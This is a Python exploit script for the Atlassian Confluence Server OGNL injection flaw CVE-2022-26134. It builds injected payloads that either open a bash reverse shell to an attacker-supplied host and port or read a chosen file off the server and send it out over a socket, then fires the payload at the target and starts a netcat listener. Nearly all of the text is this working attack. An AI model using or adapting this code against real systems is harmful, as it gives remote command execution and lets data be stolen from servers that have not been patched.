import urllib.parse
import urllib3
import argparse
import requests
import sys
import os

urllib3.disable_warnings()

def parse_arguments():
    parser = argparse.ArgumentParser(description='Atlassian Confluence Server exploit (CVE-2022-26134)')
    parser.add_argument('--rhost', required=True, help="The remote address to exploit")
    parser.add_argument('--rport', type=int, default=443, help="The remote port to exploit")
    parser.add_argument('--lhost', required=True, help="The local address to connect back to")
    parser.add_argument('--lport', type=int, default=1270, help="The local port to connect back to")
    parser.add_argument('--protocol', default="https://", help="The protocol handler to use")
    parser.add_argument('--reverse-shell', action="store_true", help="Execute a bash shell")
    parser.add_argument('--fork-nc', action="store_true", default=True, help="Directs the program to start an nc listener")
    parser.add_argument('--nc-path', default="/usr/bin/nc", help="The path to nc")
    parser.add_argument('--read-file', help="From memory, read the provided file")
    return parser.parse_args()

def start_nc_listener(args):
    if args.fork_nc:
        pid = os.fork()
        if pid == 0:  # Child process
            print('[+] Starting a netcat listener')
            os.execv(args.ncpath, [args.ncpath, '-lvnp', str(args.lport)])
        else:
            print('[+] Forking netcat listener')

def generate_payload(args):
    if args.reverse_shell:
        print('[+] Generating reverse shell payload')
        return (
            '${Class.forName("com.opensymphony.webwork.ServletActionContext")'
            '.getMethod("getResponse",null).invoke(null,null).setHeader("", '
            'Class.forName("javax.script.ScriptEngineManager").newInstance()'
            '.getEngineByName("nashorn").eval("new java.lang.ProcessBuilder()'
            '.command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\')'
            '.start()"))}'
        )
    elif args.read_file:
        print(f'[+] Generating payload to read file: {args.read_file}')
        return (
            '${Class.forName("com.opensymphony.webwork.ServletActionContext")'
            '.getMethod("getResponse",null).invoke(null,null).setHeader("", '
            'Class.forName("javax.script.ScriptEngineManager").newInstance()'
            '.getEngineByName("nashorn").eval("var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\'' + args.read_file + '\')));'
            'var sock = new java.net.Socket(\'' + args.lhost + '\', ' + str(args.lport) + ');'
            'var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream()));'
            'output.write(data); output.flush(); sock.close();"))}'
        )
    else:
        print('[-] No valid action selected: choose either --reverse-shell or --read-file')
        sys.exit(1)

def send_exploit(target_url, payload):
    encoded_payload = urllib.parse.quote(payload)
    full_url = f"{target_url}/{encoded_payload}/"
    print(f'[+] Sending exploit to {full_url}')
    try:
        requests.get(full_url, verify=False)
    except requests.RequestException as e:
        print(f'[-] The HTTP request failed: {e}')
        sys.exit(1)

def main():
    args = parse_arguments()

    # Check for argument conflicts
    if args.reverse_shell and args.read_file:
        print('[-] Cannot specify both reverse shell and read file options.')
        sys.exit(1)

    # Start netcat listener if needed
    if args.fork_nc:
        start_nc_listener(args)

    # Generate payload
    payload = generate_payload(args)

    # Build target URL and send exploit
    target_url = f"{args.protocol}{args.rhost}:{args.rport}"
    send_exploit(target_url, payload)

if __name__ == "__main__":
    main()
